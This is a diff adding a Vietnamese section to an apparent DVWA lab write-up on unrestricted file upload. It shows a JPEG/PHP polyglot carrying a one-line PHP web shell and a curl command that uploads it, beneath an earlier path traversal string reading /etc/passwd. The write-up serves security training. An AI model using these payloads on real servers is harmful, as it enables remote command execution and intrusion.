@@ -61,3 +61,58 @@ file/../../../../../../etc/passwd
 - Đọc tệp tin hệ thống qua Path Traversal
 <img width="2029" height="1338" alt="image" src="https://github.com/user-attachments/assets/026e60e3-6cc3-430e-ad90-a7f6754199c3" />
 
+# Unrestricted File Upload (OWASP A08:2021 - Software and Data Integrity Failures)
+
+## Method
+Phân tích chức năng tải lên tại `/vulnerabilities/upload/` cho thấy cơ chế xác thực tệp tin không đầy đủ.
+
+Mặc dù ứng dụng dường như kiểm tra phần mở rộng và kiểu MIME của tệp (ví dụ: sử dụng `getimagesize()` hoặc `exif_imagetype()` để xác nhận nó là ảnh), nó **không phân tích nội dung bên trong của tệp**.
+
+Điều này cho phép kẻ tấn công tạo ra một tệp *polyglot* (tệp đa định dạng) — một tệp vừa là `image/jpeg` hợp lệ, vừa chứa mã PHP độc hại — và tải nó lên máy chủ thành công.
+
+---
+
+## Proof of Value (PoV)
+Kịch bản này chứng minh rằng một tệp chứa mã PHP có thể được tải lên và lưu trữ trên máy chủ, qua mặt cơ chế kiểm tra tệp ảnh.
+
+### Kịch bản: Tải lên tệp Polyglot (JPEG + PHP)
+- **Mục tiêu:** Tải lên một tệp webshell đơn giản có đuôi `.jpg`.
+- **Ý tưởng:** Tạo một tệp `shell.jpg` là một tệp JPEG hợp lệ nhưng có chèn mã PHP vào dữ liệu EXIF hoặc metadata.
+
+**Baseline JSON (mô tả tệp):**
+```json
+{
+  "filename": "shell.jpg",
+  "Content-Type": "image/jpeg",
+  "content_summary": "Real JPEG file + PHP payload in EXIF"
+}
+```
+
+**Ví dụ nội dung tệp (khái quát):**
+```
+[Dữ liệu JPEG hợp lệ] ... <?php system($_GET['cmd']); ?> ... [Dữ liệu JPEG còn lại]
+```
+
+**Lệnh Tải lên (cURL):**
+```bash
+curl -i -X POST 'http://[DVWA_IP]/vulnerabilities/upload/'      -b 'security=high; PHPSESSID=[YOUR_SESSION_ID]'      -F 'MAX_FILE_SIZE=100000'      -F 'uploaded=@shell.jpg;type=image/jpeg'      -F 'Upload=Upload'
+```
+
+**Kết quả mong đợi:**
+- Response của máy chủ sẽ xác nhận tệp đã được tải lên thành công và có thể tiết lộ đường dẫn lưu trữ, ví dụ:
+```
+...
+<pre>../../hackable/uploads/shell.jpg</pre>
+...
+```
+- Điều này xác nhận rằng tệp `shell.jpg` (chứa mã PHP) hiện đang được lưu trữ trên hệ thống.
+
+---
+
+## Screenshots
+- `[Screenshot của lệnh exiftool hoặc hexeditor cho thấy mã PHP bên trong tệp shell.jpg]`  
+- `[Screenshot của response từ server xác nhận ../../hackable/uploads/shell.jpg đã được tải lên thành công]`
+
+
+
+
